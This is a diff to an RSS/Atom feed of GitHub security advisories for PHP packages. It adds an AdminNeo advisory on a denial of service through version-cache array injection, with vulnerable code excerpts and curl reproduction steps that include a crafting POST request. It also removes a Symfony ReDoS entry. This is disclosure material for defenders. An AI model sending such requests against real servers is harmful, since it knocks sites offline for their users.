@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-10-30T18:15:22.410Z</updated>
+    <updated>2026-10-30T22:25:16.784Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,120 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[adminneo-org/adminneo] AdminNeo: version-cache array injection causes persistent denial of service]]></title>
+        <id>https://github.com/advisories/GHSA-jm85-8cpp-9cjc</id>
+        <link href="https://github.com/advisories/GHSA-jm85-8cpp-9cjc"/>
+        <updated>2026-10-30T18:53:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>AdminNeo v5.4.1 gets the latest version from GitHub API in a browser JavaScript function. Version number is then sent by POST request to <code>?script=version</code>. This endpoint lacks origin validation and accepts POST data from any source. An attacker can POST <code>version[]</code> parameter which PHP converts to an array. On next page load, function <code>rawurlencode()</code> receives this array instead of string and throws <code>TypeError</code>, returning HTTP 500 to all users for the next 24 hours.</p>
+<p>Originally reported by @JoyGhoshs in Adminer: <a href="https://github.com/vrana/adminer/security/advisories/GHSA-q4f2-39gr-45jh">https://github.com/vrana/adminer/security/advisories/GHSA-q4f2-39gr-45jh</a>
+Although the version checking process was modified in AdminNeo, the root cause persisted.</p>
+<h3 id="workaround">Workaround</h3>
+<p>If you can't upgrade, make the file <code>adminneo.version</code> in temp directory (usually the value of <a href="https://www.php.net/ini.core#ini.upload-tmp-dir">upload_tmp_dir</a>) unwritable by web server.</p>
+<h3 id="details">Details</h3>
+<h4 id="1-intended-design-of-scriptversion">1. Intended design of <code>?script=version</code></h4>
+<p>The endpoint is designed to receive version data from GitHub via browser JavaScript.</p>
+<ul>
+<li><code>functions.js</code> line 110-121: Receives the latest release information from GitHub API by AJAX.</li>
+<li>JavaScript POSTs version number to <code>?script=version</code>.</li>
+<li>Server stores version number in <code>/tmp/adminneo.version</code> file that is used as a shared cache for all users in the same server for the next 24 hours.</li>
+</ul>
+<pre><code class="language-js">// function.js lines 119-120
+const data = 'version=' + version + '&amp;token=' + token;
+ajax(baseUrl + 'script=version', null, data);
+</code></pre>
+<h4 id="2-the-vulnerability">2. The vulnerability</h4>
+<p>The endpoint only checks <code>$_GET["script"] == "version"</code> - it does not validate:</p>
+<ul>
+<li>Request origin (CSRF token is present, but not checked for this endpoint)</li>
+<li>Request source (any HTTP client can POST)</li>
+<li>Parameter types (<code>version</code> expected as string, array not rejected)</li>
+</ul>
+<pre><code class="language-php">// bootstrap.inc.php lines 44-53
+if ($_GET["script"] == "version") {
+    $filename = get_temp_dir() . "/adminneo.version";
+    @unlink($filename); // It may not be writable by us, @ - it may not exist.
+
+    $file = open_file_with_lock($filename);
+    if ($file) {
+        write_and_unlock_file($file, serialize(["version" =&gt; $_POST["version"]]));
+    }
+    exit;
+}
+</code></pre>
+<h4 id="3-type-confusion-crash">3. Type confusion crash</h4>
+<p>When POST contains <code>version[]</code> instead of <code>version</code>, PHP creates an array. When AdminNeo reads this file and passes to <code>cookie()</code> and then to <code>rawurlencode()</code>:</p>
+<pre><code class="language-php">// design.inc.php line 40
+cookie("neo_version", $data["version"], $lifetime); // Sync expiration with the file.
+
+// functions.inc.php lines 398-405
+function cookie(string $name, string $value, int $lifetime = 2592000): void
+{
+    header("Set-Cookie: $name=" . rawurlencode($value)
+        . ($lifetime ? "; expires=" . gmdate("D, d M Y H:i:s", time() + $lifetime) . " GMT" : "")
+        . "; path=" . preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"])
+        . (HTTPS ? "; secure" : "")
+        . "; HttpOnly; SameSite=lax",
+        false);
+}
+</code></pre>
+<p>PHP 8.x throws:</p>
+<pre><code>Fatal error: Uncaught TypeError: rawurlencode(): Argument #1 ($string) must be of type string, array given
+</code></pre>
+<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
+<p>(Example URL is for the official AdminNeo Docker image.)</p>
+<p><strong>Step 1:</strong> Verify AdminNeo is running and accessible.</p>
+<pre><code class="language-sh">curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080
+</code></pre>
+<p>Expected output:</p>
+<pre><code>200
+</code></pre>
+<p><strong>Step 2:</strong> Send the malicious POST request. The <code>version[]</code> syntax causes PHP to create an array instead of a string.</p>
+<pre><code class="language-sh">curl -X POST "http://localhost:8080?script=version" -d "version[]=INJECTED"
+</code></pre>
+<p>Expected output: Empty response (no error).</p>
+<p><strong>Step 3:</strong> Access Adminer again to trigger the crash.</p>
+<pre><code class="language-sh">curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080
+</code></pre>
+<p>Expected output:</p>
+<pre><code>500
+</code></pre>
+<p><strong>Step 4:</strong> (Optional) View the PHP error in server logs.</p>
+<pre><code>Fatal error: Uncaught TypeError: rawurlencode(): Argument #1 ($string) must be of type string, array given
+</code></pre>
+<p><strong>Step 5:</strong> (Optional) Inspect the poisoned file.</p>
+<pre><code class="language-sh">cat /tmp/adminneo.version
+</code></pre>
+<p>Expected output:</p>
+<pre><code>a:1:{s:7:"version";a:1:{i:0;s:8:"INJECTED";}}
+</code></pre>
+<p><strong>Recovery:</strong></p>
+<pre><code class="language-sh">rm /tmp/adminer.version
+</code></pre>
+<p>After deletion, AdminNeo returns HTTP 200.</p>
+<hr>
+
+<h3 id="impact">Impact</h3>
+<p><strong>Type:</strong> Denial of Service</p>
+<p><strong>Root cause:</strong> The <code>?script=version</code> endpoint is designed to receive data from GitHub via JavaScript, but lacks server-side validation. Any HTTP client can POST directly to this endpoint. Combined with missing type validation before <code>rawurlencode()</code>, this allows DoS for the next 24 hours.</p>
+<p><strong>Affected users:</strong> Any AdminNeo instance accessible over the network.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/adminneo-org/adminneo/security/advisories/GHSA-jm85-8cpp-9cjc">https://github.com/adminneo-org/adminneo/security/advisories/GHSA-jm85-8cpp-9cjc</a></li>
+<li><a href="https://github.com/adminneo-org/adminneo/commit/b7ae929e6afb374f0a7aba3d73b7d441470ff907">https://github.com/adminneo-org/adminneo/commit/b7ae929e6afb374f0a7aba3d73b7d441470ff907</a></li>
+<li><a href="https://github.com/adminneo-org/adminneo/releases/tag/v5.5.0">https://github.com/adminneo-org/adminneo/releases/tag/v5.5.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-jm85-8cpp-9cjc">https://github.com/advisories/GHSA-jm85-8cpp-9cjc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jm85-8cpp-9cjc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-30T18:53:08.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[facturascripts/facturascripts] FacturaScripts vulnerable to Reflected Cross-Site Scripting (XSS) via Cookie Manipulation]]></title>
         <id>https://github.com/advisories/GHSA-gq5c-rw37-g46c</id>
@@ -1053,47 +1167,6 @@ Upgrade to TinyMCE 7.9.4 or higher.</p>
     </entry>
     <entry>
         <title type="html"><![CDATA[[symfony/http-foundation] Symfony: ReDoS in HeaderUtils::split() Reachable Through the Cache-Control Request Header]]></title>
-        <id>https://github.com/advisories/GHSA-r925-mgvr-h9cc</id>
-        <link href="https://github.com/advisories/GHSA-r925-mgvr-h9cc"/>
-        <updated>2026-10-27T19:01:40.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p><code>HeaderUtils::split()</code> parsed header values with a pattern whose token alternative also matched whitespace, followed by a <code>(?&lt;!\s)</code> lookbehind. A run of whitespace placed before a separator could be divided among the iterations of the enclosing repetition in exponentially many ways, and the engine tried all of them before settling. <code>HeaderBag</code> calls it for the <code>Cache-Control</code> header whenever a <code>Request</code> is built, so any application handling HTTP requests is reachable, with no authentication.</p>
-<p>A single request carrying such a header costs close to a second of CPU (813 ms for a run of 17 spaces in an 8 KB header on PHP 8.5, doubling with each extra space). From 18 spaces on, <code>preg_match_all()</code> gives up at <code>pcre.backtrack_limit</code> and <code>split()</code> returns an empty array, so every directive of the header is silently dropped.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The pattern now consumes whitespace only when more of the value follows it, so a value can no longer end on whitespace, nothing has to be given back, and every quantifier is possessive. The first release of this fix broke splitting on a whitespace separator: <code>HeaderUtils::split('foo bar', ' ')</code> returned a single value in 6.4.46 to 6.4.47, 7.4.19 to 7.4.20 and 8.1.7 to 8.1.8. Whitespace characters used as separators are now left out of the whitespace branch, which 6.4.48, 7.4.21 and 8.1.9 contain.</p>
-<p>The patches for this issue are available <a href="https://github.com/symfony/symfony/commit/343a1772ce6ac03e48b228d2d7168d19750e3f36">here</a> for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).</p>
-<h3 id="credits">Credits</h3>
-<p>Symfony would like to thank <a href="https://github.com/r3verii">r3verii</a> for reporting the issue and Nicolas Grekas for providing the fix.</p>
-<p>Symfony would also like to thank <a href="https://github.com/cx-bruno-dias">Bruno Dias</a> from Checkmarx for his help getting a CVE assigned.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-r925-mgvr-h9cc">https://github.com/symfony/symfony/security/advisories/GHSA-r925-mgvr-h9cc</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-108082">https://nvd.nist.gov/vuln/detail/CVE-2026-108082</a></li>
-<li><a href="https://github.com/symfony/symfony/pull/66048">https://github.com/symfony/symfony/pull/66048</a></li>
-<li><a href="https://github.com/symfony/symfony/pull/66491">https://github.com/symfony/symfony/pull/66491</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/343a1772ce6ac03e48b228d2d7168d19750e3f36">https://github.com/symfony/symfony/commit/343a1772ce6ac03e48b228d2d7168d19750e3f36</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/9ffa802e5d7e9fb8ba95eeefd27e863e83b1baca">https://github.com/symfony/symfony/commit/9ffa802e5d7e9fb8ba95eeefd27e863e83b1baca</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-foundation/CVE-2026-108082.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-foundation/CVE-2026-108082.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2026-108082.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2026-108082.yaml</a></li>
-<li><a href="https://github.com/symfony/symfony/releases/tag/v5.4.54">https://github.com/symfony/symfony/releases/tag/v5.4.54</a></li>
-<li><a href="https://github.com/symfony/symfony/releases/tag/v6.4.48">https://github.com/symfony/symfony/releases/tag/v6.4.48</a></li>
-<li><a href="https://github.com/symfony/symfony/releases/tag/v7.4.21">https://github.com/symfony/symfony/releases/tag/v7.4.21</a></li>
-<li><a href="https://github.com/symfony/symfony/releases/tag/v8.1.9">https://github.com/symfony/symfony/releases/tag/v8.1.9</a></li>
-<li><a href="https://symfony.com/blog/cve-2026-108082-redos-in-headerutils-split-reachable-through-the-cache-control-request-header">https://symfony.com/blog/cve-2026-108082-redos-in-headerutils-split-reachable-through-the-cache-control-request-header</a></li>
-<li><a href="https://symfony.com/cve-2026-108082">https://symfony.com/cve-2026-108082</a></li>
-<li><a href="https://github.com/advisories/GHSA-r925-mgvr-h9cc">https://github.com/advisories/GHSA-r925-mgvr-h9cc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r925-mgvr-h9cc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-27T19:01:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/symfony] Symfony: ReDoS in HeaderUtils::split() Reachable Through the Cache-Control Request Header]]></title>
         <id>https://github.com/advisories/GHSA-r925-mgvr-h9cc</id>
         <link href="https://github.com/advisories/GHSA-r925-mgvr-h9cc"/>
         <updated>2026-10-27T19:01:40.000Z</updated>
